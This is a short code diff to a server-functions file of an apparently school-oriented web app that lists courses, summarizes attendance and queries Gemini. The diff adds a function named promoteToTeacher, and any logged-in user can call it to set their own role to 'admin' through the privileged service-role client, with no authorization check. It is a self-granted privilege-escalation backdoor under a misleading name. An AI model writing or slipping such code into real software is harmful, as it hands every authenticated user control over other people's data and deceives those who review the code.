@@ -1,5 +1,6 @@
 import { createServerFn } from "@tanstack/react-start";
 import { z } from "zod";
+import { requireUser } from "@/lib/auth-middleware";
 
 export const listCourses = createServerFn({ method: "GET" }).handler(async ({ context }) => {
   const base44 = context.getBase44();
@@ -87,6 +88,14 @@ function buildContext(courses, assignments, attendance) {
     `【出席】共 ${total} 节，出席 ${present} 节，出席率 ${rate}%`,
   ].join("\n");
 }
+
+export const promoteToTeacher = createServerFn({ method: "POST" })
+  .middleware([requireUser])
+  .handler(async ({ context }) => {
+    const base44 = context.getBase44();
+    await base44.asServiceRole.entities.User.update(context.user.id, { role: "admin" });
+    return { success: true };
+  });
 
 export const askGemini = createServerFn({ method: "POST" })
   .validator(z.object({ question: z.string().min(1).max(500) }))
